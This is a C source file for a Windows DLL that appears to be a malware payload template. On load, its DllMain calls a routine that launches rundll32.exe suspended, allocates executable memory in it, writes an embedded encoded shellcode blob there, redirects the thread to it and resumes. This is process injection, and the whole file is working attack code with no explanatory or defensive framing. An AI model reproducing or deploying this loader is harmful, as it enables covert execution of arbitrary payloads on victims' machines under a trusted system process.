#include <windows.h>

#define SCSIZE 2048
unsigned char code[SCSIZE] = 
"\xdb\xc5\xd9\x74\x24\xf4\x58\xbd\xc0\x1f\xb7\x34\x2b\xc9\xb1"
"\x31\x31\x68\x17\x03\x68\x17\x83\x28\xe3\x55\xc1\x54\xf4\x18"
"\x2a\xa4\x05\x7d\xa2\x41\x34\xbd\xd0\x02\x67\x0d\x92\x46\x84"
"\xe6\xf6\x72\x1f\x8a\xde\x75\xa8\x21\x39\xb8\x29\x19\x79\xdb"
"\xa9\x60\xae\x3b\x93\xaa\xa3\x3a\xd4\xd7\x4e\x6e\x8d\x9c\xfd"
"\x9e\xba\xe9\x3d\x15\xf0\xfc\x45\xca\x41\xfe\x64\x5d\xd9\x59"
"\xa7\x5c\x0e\xd2\xee\x46\x53\xdf\xb9\xfd\xa7\xab\x3b\xd7\xf9"
"\x54\x97\x16\x36\xa7\xe9\x5f\xf1\x58\x9c\xa9\x01\xe4\xa7\x6e"
"\x7b\x32\x2d\x74\xdb\xb1\x95\x50\xdd\x16\x43\x13\xd1\xd3\x07"
"\x7b\xf6\xe2\xc4\xf0\x02\x6e\xeb\xd6\x82\x34\xc8\xf2\xcf\xef"
"\x71\xa3\xb5\x5e\x8d\xb3\x15\x3e\x2b\xb8\xb8\x2b\x46\xe3\xd6"
"\xaa\xd4\x9e\x95\xad\xe6\xa0\x89\xc5\xd7\x2b\x46\x91\xe7\xfe"
"\x22\x6d\xa2\xa2\x03\xe6\x6b\x37\x16\x6b\x8c\xe2\x55\x92\x0f"
"\x06\x26\x61\x0f\x63\x23\x2d\x97\x98\x59\x3e\x72\x9e\xce\x3f"
"\x57\xfd\x9d\xdb\x76\x64\x26\x41\x87";

/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
   
           BYTE *q = (BYTE *)p;
           size_t x = 0;
           for (x = 0; x < l; x++)
                     *(q++) = 0x00;
}



void ExecutePayload(void);

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
			ExecutePayload();
            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}

void ExecutePayload(void) {
    int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
   LPVOID ep;

	// Start up the payload in a new process
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

	   ctx.Eip = (DWORD)ep;

        SetThreadContext(pi.hThread,&ctx);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
	}
   // ExitProcess(0);

}

/*
typedef VOID
(NTAPI *PIMAGE_TLS_CALLBACK) (
    PVOID DllHandle,
    ULONG Reason,
    PVOID Reserved
    );

VOID NTAPI TlsCallback(
      IN PVOID DllHandle,
      IN ULONG Reason,
      IN PVOID Reserved)
{
	__asm  ( "int3" );
}

ULONG _tls_index;
PIMAGE_TLS_CALLBACK _tls_cb[] = { TlsCallback, NULL };
IMAGE_TLS_DIRECTORY _tls_used = { 0, 0, (ULONG)&_tls_index, (ULONG)_tls_cb, 1000, 0 };
*/

